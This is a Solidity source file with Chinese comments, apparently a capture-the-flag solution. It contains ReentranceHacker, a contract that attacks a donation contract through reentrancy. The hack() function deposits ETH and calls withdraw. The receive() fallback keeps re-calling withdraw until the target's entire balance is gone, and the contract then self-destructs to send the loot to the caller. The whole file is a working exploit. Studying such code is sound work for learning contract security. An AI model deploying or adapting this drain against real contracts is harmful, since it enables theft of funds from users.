// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/*
  通过 低级调用call及receive漏洞实现重入攻击
*/

interface IReentrance {
    function donate(address) external payable;

    function balanceOf(address) external view returns (uint256);

    function withdraw(uint256) external;
}

// 重入提款合约
contract ReentranceHacker {
    IReentrance rentrance;

    constructor(address _rentrance) public {
        rentrance = IReentrance(_rentrance);
    }

    // 存入0.001ETH 并立即提款
    function hack() public payable {
        // 存入ETH
        rentrance.donate{value: msg.value}(address(this));

        // 提取ETH
        rentrance.withdraw(msg.value);

        // 掏空资金池
        require(address(rentrance).balance == 0, "failed!");

        // 销毁合约，转出ETH
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        // 攻击合约余额
        uint256 balance = rentrance.balanceOf(address(this));

        // 最终提款数额
        uint256 withdrawAmount = balance < 0.001 ether ? balance : 0.001 ether;

        // 检查防止回退
        if (withdrawAmount > 0) {
            rentrance.withdraw(withdrawAmount);
        }
    }
}
